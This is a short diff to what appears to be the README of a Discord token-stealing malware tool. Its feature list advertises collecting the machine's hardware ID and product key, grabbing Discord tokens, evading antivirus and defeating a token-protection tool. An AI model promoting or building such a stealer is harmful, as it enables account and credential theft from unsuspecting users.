@@ -20,7 +20,7 @@ https://discord.gg/YAeDeVdPWH
 - os
 - computername
 - hwid
-- instant tokengrabber
+- instant tokengrabber #fixed by discord
 - undetectable from any antivirus
 - Discord Token Protector fucker https://github.com/andro2157/DiscordTokenProtector
 - Productkey
